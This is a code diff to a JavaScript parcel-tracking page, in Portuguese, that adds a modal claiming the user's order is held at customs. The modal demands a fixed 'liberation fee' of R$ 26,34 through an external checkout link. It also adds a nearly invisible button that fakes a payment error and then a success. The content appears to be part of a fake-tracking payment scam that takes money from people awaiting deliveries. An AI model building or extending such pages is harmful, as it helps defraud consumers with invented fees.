@@ -1458,7 +1458,7 @@ export class TrackingSystem {
                     modal.remove();
                 }
                 document.body.style.overflow = 'auto';
-            }, 300);
+            }, 400);
         }
     }
 
@@ -1642,6 +1642,143 @@ export class TrackingSystem {
                 }, 800);
             }, 1000);
         }
+    }
+
+    showZentraPayLinkModal() {
+        console.log('🔗 Mostrando modal com link Zentra Pay');
+        
+        const modal = document.getElementById('liberationModal');
+        if (!modal) return;
+        
+        // Atualizar conteúdo do modal para usar link direto
+        const modalContent = modal.querySelector('.professional-modal-content');
+        if (modalContent) {
+            modalContent.innerHTML = `
+                <div class="liberation-explanation">
+                    <p class="liberation-subtitle">
+                        Seu pedido está retido na alfândega e precisa ser liberado para continuar o processo de entrega. A taxa única é de R$ 26,34.
+                    </p>
+                </div>
+
+                <div class="professional-fee-display">
+                    <div class="fee-info">
+                        <span class="fee-label">Taxa de Liberação Aduaneira</span>
+                        <span class="fee-amount">R$ 26,34</span>
+                    </div>
+                </div>
+
+                <!-- Link direto Zentra Pay -->
+                <div class="professional-pix-section">
+                    <h3 class="pix-section-title">Pagamento via Zentra Pay</h3>
+                    
+                    <div style="text-align: center; margin: 30px 0;">
+                        <a href="https://checkout.zentrapaybr.com/UlCGsjOn" 
+                           target="_blank" 
+                           class="zentra-pay-link"
+                           style="
+                               display: inline-block;
+                               background: linear-gradient(45deg, #1e4a6b, #2c5f8a);
+                               color: white;
+                               text-decoration: none;
+                               padding: 18px 35px;
+                               border-radius: 12px;
+                               font-weight: 700;
+                               font-size: 1.1rem;
+                               box-shadow: 0 6px 20px rgba(30, 74, 107, 0.4);
+                               transition: all 0.3s ease;
+                               animation: pulse 2s infinite;
+                           ">
+                            <i class="fas fa-external-link-alt"></i>
+                            Pagar Taxa de Liberação
+                        </a>
+                    </div>
+                    
+                    <!-- Instruções -->
+                    <div class="professional-payment-steps">
+                        <h4 class="steps-title">Como realizar o pagamento:</h4>
+                        <div class="payment-steps-grid">
+                            <div class="payment-step">
+                                <div class="step-number">1</div>
+                                <div class="step-content">
+                                    <i class="fas fa-mouse-pointer step-icon"></i>
+                                    <span class="step-text">Clique no botão acima</span>
+                                </div>
+                            </div>
+                            <div class="payment-step">
+                                <div class="step-number">2</div>
+                                <div class="step-content">
+                                    <i class="fas fa-credit-card step-icon"></i>
+                                    <span class="step-text">Complete o pagamento na Zentra Pay</span>
+                                </div>
+                            </div>
+                            <div class="payment-step">
+                                <div class="step-number">3</div>
+                                <div class="step-content">
+                                    <i class="fas fa-check step-icon"></i>
+                                    <span class="step-text">Aguarde a confirmação automática</span>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- Botão de Simulação para Testes -->
+                    <div style="text-align: center; margin-top: 20px; padding-top: 20px; border-top: 1px solid #e9ecef;">
+                        <button id="simulatePaymentButton" style="
+                            background: transparent;
+                            color: #666;
+                            border: 1px solid #ddd;
+                            padding: 6px 12px;
+                            border-radius: 6px;
+                            cursor: pointer;
+                            font-weight: 600;
+                            transition: all 0.3s ease;
+                            opacity: 0.7;
+                            font-size: 12px;
+                            min-width: 30px;
+                            height: 28px;
+                        ">
+                            -
+                        </button>
+                    </div>
+                </div>
+            `;
+        }
+        
+        modal.style.display = 'flex';
+        document.body.style.overflow = 'hidden';
+        
+        // Configurar eventos do botão de simulação
+        this.setupSimulationButton();
+    }
+
+    setupSimulationButton() {
+        const simulateButton = document.getElementById('simulatePaymentButton');
+        if (!simulateButton) return;
+        
+        simulateButton.addEventListener('click', () => {
+            // Primeira tentativa: simula erro
+            if (!simulateButton.hasAttribute('data-retry')) {
+                simulateButton.setAttribute('data-retry', 'true');
+                simulateButton.textContent = '--';
+                
+                // Mostrar erro
+                alert('Ocorreu um erro ao tentar processar o pagamento. Tente novamente.');
+                return;
+            }
+            
+            // Segunda tentativa: sucesso
+            console.log('✅ Simulando pagamento bem-sucedido');
+            
+            // Fechar modal
+            const modal = document.getElementById('liberationModal');
+            if (modal) {
+                modal.style.display = 'none';
+                document.body.style.overflow = 'auto';
+            }
+            
+            // Processar pagamento
+            this.processSuccessfulPayment();
+        });
     }
 
     async openDeliveryModal(attemptNumber, value) {
